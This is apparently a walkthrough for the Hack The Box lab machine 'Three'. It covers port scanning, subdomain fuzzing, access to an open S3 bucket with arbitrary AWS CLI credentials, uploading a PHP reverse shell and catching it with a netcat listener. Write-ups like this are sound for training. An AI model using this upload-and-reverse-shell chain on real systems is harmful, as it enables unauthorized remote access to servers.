# Three (Starting Point, Tier 1 Machine)

## Victim IP

`export target="10.129.118.95"`

## Attacker IP

`export attacker="10.10.14.94"`

## Open ports

```
 sudo nmap -Pn -p- -sS -T4 ${target}
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-20 00:26 EST
Nmap scan report for 10.129.118.95
Host is up (0.020s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 10.50 seconds
```

## Enumerate open ports

```
nmap -Pn -p22,80 -sC -sV ${target} -oA ${target}
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-20 00:28 EST
Nmap scan report for 10.129.118.95
Host is up (0.0044s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 17:8b:d4:25:45:2a:20:b8:79:f8:e2:58:d7:8e:79:f4 (RSA)
|   256 e6:0f:1a:f6:32:8a:40:ef:2d:a7:3b:22:d1:c7:14:fa (ECDSA)
|_  256 2d:e1:87:41:75:f3:91:54:41:16:b7:2b:80:c6:8f:05 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: The Toppers
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.89 seconds
```

## Task 1

`See nmap output`

## Task 2

Visit the site in the web browser and navigate to the contact page

## Task 3

Update the /etc/hosts file to point the IP address of the victim box to the domain name listed in the contact page

## Task 4

sudomain enumeration using wfuzz:  

```
wfuzz -w /tmp/dns-2characters.txt -H "Host: FUZZ.thetoppers.htb" --hc 200 -t 150 -v --follow 10.129.118.95
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.129.118.95/
Total requests: 952

====================================================================================================================================================
ID           C.Time       Response   Lines      Word     Chars       Server                           Redirect                         Payload                                                       
====================================================================================================================================================

000000208:   0.078s       404        0 L        2 W      21 Ch       hypercorn-h11                                                     "s3"                                                          

Total time: 7.885646
Processed Requests: 952
Filtered Requests: 951
Requests/sec.: 120.7256
```

subdomain enumeration using gobuster:  

```
gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb append-domain                                                                             2 ⨯
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://thetoppers.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/11/20 02:26:55 Starting gobuster in VHOST enumeration mode
===============================================================
Found: s3.thetoppers.htb (Status: 404) [Size: 21]
Found: gc._msdcs.thetoppers.htb (Status: 400) [Size: 306]
                                                         
===============================================================
2022/11/20 02:26:58 Finished
===============================================================
```

Add newly discovered subdomain to /etc/hosts    


## Task 5

Running dirb against the newly discovered subdomain found 3 endpoints:

```
dirb http://s3.thetoppers.htb             

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Nov 20 02:33:39 2022
URL_BASE: http://s3.thetoppers.htb/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://s3.thetoppers.htb/ ----
+ http://s3.thetoppers.htb/graph (CODE:405|SIZE:178)                                                                                                                                                          
+ http://s3.thetoppers.htb/health (CODE:200|SIZE:888)                                                                                                                                                         
+ http://s3.thetoppers.htb/server-status (CODE:403|SIZE:282)                                                                                                                                                  
                                                                                                                                                                                                              
-----------------
END_TIME: Sun Nov 20 02:35:33 2022
DOWNLOADED: 4612 - FOUND: 3

```
Visiting the health endpoint gives us the flag for task 5  

## Task 6

The flag for this one is `awscli`

## Task 7

RTFM at [AWS Command Line Interface]("https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-quickstart.html")

We can enter arbitriry data here
```
aws configure                                       
AWS Access Key ID [None]: responder
AWS Secret Access Key [None]: responder
Default region name [None]: responder
Default output format [json]: json
```

## Task 8

RTFM at [AWS Command Line Interface]("https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-quickstart.html")

```
aws --endpoint=http://s3.thetoppers.htb s3 ls                                                                                                                                                        255 ⨯
2022-11-20 20:59:02 thetoppers.htb
```

## Task 9

Referring to WhatRuns firefox extension, we know that site is running `PHP 7.4.30`.  Also looking at the contents of the s3 bucket we can see a file extension of php:  
```
aws --endpoint=http://s3.thetoppers.htb/ s3 ls s3://thetoppers.htb
                           PRE images/
2022-11-20 20:59:02          0 .htaccess
2022-11-20 20:59:02      11952 index.php

```

## Submit Flag

Either write your own reverse web shell or search online for a reverse shell template online.  I used the php reverse shell from pentest monkey, [php-reverse-shell]("https://github.com/pentestmonkey/php-reverse-shell")  

Upload the file with the following command: 

```
aws --endpoint=http://s3.thetoppers.htb/ s3 cp shell.php s3://thetoppers.htb
upload: ./shell.php to s3://thetoppers.htb/shell.php  
```

Set up your netcat listener, browse to the shell (http://thetoppers.htb/shell.php), and catch the connection:  

```
nc -nvlp 4444                                                                                                                                                                                          1 ⨯
listening on [any] 4444 ...
connect to [10.10.14.94] from (UNKNOWN) [10.129.183.243] 39748
Linux three 4.15.0-189-generic #200-Ubuntu SMP Wed Jun 22 19:53:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 02:31:34 up 41 min,  0 users,  load average: 0.00, 0.00, 0.06
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

Use the following command to find the flag: `find . -name *flag* 2> /dev/null`
